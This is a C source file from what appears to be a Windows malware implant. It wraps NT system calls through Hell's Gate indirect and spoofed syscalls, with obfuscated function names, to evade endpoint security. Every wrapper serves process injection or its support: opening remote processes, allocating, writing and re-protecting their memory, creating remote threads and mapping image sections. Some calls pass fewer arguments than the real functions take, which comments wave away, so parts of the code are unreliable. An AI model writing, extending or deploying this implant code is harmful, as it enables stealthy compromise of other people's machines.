/*
 * syscalls.c — NT native API wrappers using Hell's Gate indirect syscall.
 *
 * Each function:
 *   1. Calls HellsGateSetSSN("NtXxx") to load the SSN into g_ssn
 *   2. Calls HellsGateCall() with the NT-native argument layout
 *      (Windows x64: rcx/rdx/r8/r9/stack matches NT calling convention;
 *       the assembly stub does mov r10,rcx; mov eax,g_ssn; jmp [g_gadget])
 */
#include "../include/implant.h"
#include "../include/obfstr.h"

/* ── NtAllocateVirtualMemory ─────────────────────────────────────────────── */
NTSTATUS NtAlloc(HANDLE hProc, PVOID *base, SIZE_T size, ULONG protect) {
    SIZE_T sz = size;
    if (!HellsGateSetSSN(OBFSTR("NtAllocateVirtualMemory"))) return (NTSTATUS)0xC0000001;
    return HellsGateCall(
        (PVOID)hProc,
        (PVOID)base,
        (PVOID)0,
        (PVOID)&sz,
        (PVOID)(ULONG_PTR)NT_MEM_COMMIT_RESERVE,
        (PVOID)(ULONG_PTR)protect,
        NULL, NULL
    );
}

/* ── NtFreeVirtualMemory ──────────────────────────────────────────────────── */
NTSTATUS NtFree(HANDLE hProc, PVOID base) {
    SIZE_T sz = 0;
    if (!HellsGateSetSSN(OBFSTR("NtFreeVirtualMemory"))) return (NTSTATUS)0xC0000001;
    return SpoofedSyscall4(
        (PVOID)hProc,
        (PVOID)&base,
        (PVOID)&sz,
        (PVOID)(ULONG_PTR)NT_MEM_RELEASE
    );
}

/* ── NtWriteVirtualMemory ─────────────────────────────────────────────────── */
NTSTATUS NtWrite(HANDLE hProc, PVOID addr, PVOID data, SIZE_T size) {
    SIZE_T written = 0;
    if (!HellsGateSetSSN(OBFSTR("NtWriteVirtualMemory"))) return (NTSTATUS)0xC0000001;
    return HellsGateCall(
        (PVOID)hProc,
        addr,
        data,
        (PVOID)size,
        (PVOID)&written,
        NULL, NULL, NULL
    );
}

/* ── NtProtectVirtualMemory ──────────────────────────────────────────────── */
NTSTATUS NtProtect(HANDLE hProc, PVOID addr, SIZE_T size, ULONG newProt, ULONG *oldProt) {
    SIZE_T sz = size;
    ULONG  old = 0;
    if (!HellsGateSetSSN(OBFSTR("NtProtectVirtualMemory"))) return (NTSTATUS)0xC0000001;
    NTSTATUS st = HellsGateCall(
        (PVOID)hProc,
        (PVOID)&addr,
        (PVOID)&sz,
        (PVOID)(ULONG_PTR)newProt,
        (PVOID)&old,
        NULL, NULL, NULL
    );
    if (oldProt) *oldProt = old;
    return st;
}

/* ── NtCreateThreadEx ────────────────────────────────────────────────────── */
NTSTATUS NtCreateThread(HANDLE hProc, PVOID startAddr, PVOID param, HANDLE *hThread) {
    ULONG_PTR hThr = 0;
    /* NtCreateThreadEx(
         ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
         StartRoutine, Argument, CreateFlags, ZeroBits,
         StackSize, MaximumStackSize, AttributeList) */
    if (!HellsGateSetSSN(OBFSTR("NtCreateThreadEx"))) return (NTSTATUS)0xC0000001;
    NTSTATUS st = HellsGateCall(
        (PVOID)&hThr,
        (PVOID)(ULONG_PTR)0x1FFFFF,  /* THREAD_ALL_ACCESS */
        NULL,
        (PVOID)hProc,
        startAddr,
        param,
        (PVOID)(ULONG_PTR)0,   /* CreateFlags: run immediately */
        (PVOID)0
        /* remaining args (ZeroBits, StackSize, MaxStack, AttrList) default 0;
           set via shadow space; compiler places them correctly for 8-arg call */
    );
    if (hThread) *hThread = (HANDLE)hThr;
    return st;
}

/* ── NtOpenProcess ───────────────────────────────────────────────────────── */
NTSTATUS NtOpenProc(DWORD pid, DWORD access, HANDLE *hOut) {
    NT_OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, 0, NULL, NULL };
    NT_CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = NULL;
    ULONG_PTR hProc = 0;
    if (!HellsGateSetSSN(OBFSTR("NtOpenProcess"))) return (NTSTATUS)0xC0000001;
    NTSTATUS st = SpoofedSyscall4(
        (PVOID)&hProc,
        (PVOID)(ULONG_PTR)access,
        (PVOID)&oa,
        (PVOID)&cid
    );
    if (hOut) *hOut = (HANDLE)hProc;
    return st;
}

/* ── NtDelayExecution ────────────────────────────────────────────────────── */
NTSTATUS NtDelay(LONGLONG hundredNs) {
    /* Negative = relative interval */
    LONGLONG interval = -hundredNs;
    if (!HellsGateSetSSN(OBFSTR("NtDelayExecution"))) {
        Sleep((DWORD)(hundredNs / 10000));
        return STATUS_SUCCESS;
    }
    return SpoofedSyscall4(
        (PVOID)(ULONG_PTR)FALSE,   /* Alertable */
        (PVOID)&interval,
        NULL, NULL
    );
}

/* ── NtQueryInformationProcess ───────────────────────────────────────────── */
NTSTATUS NtQueryProcInfo(HANDLE hProc, PROCESSINFOCLASS cls,
                          PVOID buf, ULONG len, ULONG *retLen) {
    ULONG ret = 0;
    if (!HellsGateSetSSN(OBFSTR("NtQueryInformationProcess"))) return (NTSTATUS)0xC0000001;
    NTSTATUS st = HellsGateCall(
        (PVOID)hProc,
        (PVOID)(ULONG_PTR)cls,
        buf,
        (PVOID)(ULONG_PTR)len,
        (PVOID)&ret,
        NULL, NULL, NULL
    );
    if (retLen) *retLen = ret;
    return st;
}

/* ── NtCreateFile ────────────────────────────────────────────────────────── */
NTSTATUS NtOpenFile(NT_UNICODE_STRING *path, ULONG access, HANDLE *hOut) {
    NT_OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, path,
                                 OBJ_CASE_INSENSITIVE, NULL, NULL };
    NT_IO_STATUS_BLOCK   iosb = {0};
    ULONG_PTR h = 0;
    if (!HellsGateSetSSN(OBFSTR("NtCreateFile"))) return (NTSTATUS)0xC0000001;
    NTSTATUS st = HellsGateCall(
        (PVOID)&h,
        (PVOID)(ULONG_PTR)(NT_FILE_READ_DATA | SYNCHRONIZE),
        (PVOID)&oa,
        (PVOID)&iosb,
        NULL,
        (PVOID)(ULONG_PTR)0,                       /* FileAttributes: normal */
        (PVOID)(ULONG_PTR)NT_FILE_SHARE_READ,
        (PVOID)(ULONG_PTR)NT_FILE_OPEN
    );
    /* remaining args (EaBuffer/EaLength) default 0 via shadow space */
    if (hOut) *hOut = (HANDLE)h;
    return st;
}

/* ── NtCreateSection ─────────────────────────────────────────────────────── */
NTSTATUS NtMapSection(HANDLE hFile, PVOID *baseOut, SIZE_T *viewSize) {
    ULONG_PTR hSec = 0;
    if (!HellsGateSetSSN(OBFSTR("NtCreateSection"))) return (NTSTATUS)0xC0000001;
    NT_OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, 0, NULL, NULL };
    NTSTATUS st = HellsGateCall(
        (PVOID)&hSec,
        (PVOID)(ULONG_PTR)(NT_SECTION_MAP_READ | 0x0008 /*SECTION_QUERY*/),
        (PVOID)&oa,
        NULL,
        (PVOID)(ULONG_PTR)NT_PAGE_READONLY,
        (PVOID)(ULONG_PTR)NT_SEC_IMAGE,
        (PVOID)hFile,
        NULL
    );
    if (!NT_SUCCESS(st)) return st;

    /* NtMapViewOfSection */
    PVOID base = NULL;
    SIZE_T sz  = 0;
    LARGE_INTEGER off = {0};
    if (!HellsGateSetSSN(OBFSTR("NtMapViewOfSection"))) {
        /* close section handle — best effort */
        NTSTATUS cs; HellsGateSetSSN(OBFSTR("NtClose"));
        HellsGateCall((PVOID)(ULONG_PTR)hSec,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
        return (NTSTATUS)0xC0000001;
    }
    st = HellsGateCall(
        (PVOID)(ULONG_PTR)hSec,
        (PVOID)(LONG_PTR)-1,   /* current process */
        (PVOID)&base,
        NULL,
        NULL,
        (PVOID)&off,
        (PVOID)&sz,
        (PVOID)(ULONG_PTR)NT_VIEW_SHARE
    );
    /* remaining (ZeroBits, CommitSize, SectionOffset,ViewSize,AllocType,Win32Prot)
       are in shadow space; the last 2 args above are AllocType=ViewShare and
       Win32Protect=PAGE_READONLY passed via the 8-arg slot */
    if (NT_SUCCESS(st)) {
        *baseOut  = base;
        *viewSize = sz;
    }
    /* Close the section handle */
    HellsGateSetSSN(OBFSTR("NtClose"));
    HellsGateCall((PVOID)(ULONG_PTR)hSec,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
    return st;
}

/* ── NtUnmapViewOfSection ────────────────────────────────────────────────── */
NTSTATUS NtUnmap(PVOID base) {
    if (!HellsGateSetSSN(OBFSTR("NtUnmapViewOfSection"))) return (NTSTATUS)0xC0000001;
    return SpoofedSyscall4(
        (PVOID)(LONG_PTR)-1,
        base,
        NULL, NULL
    );
}
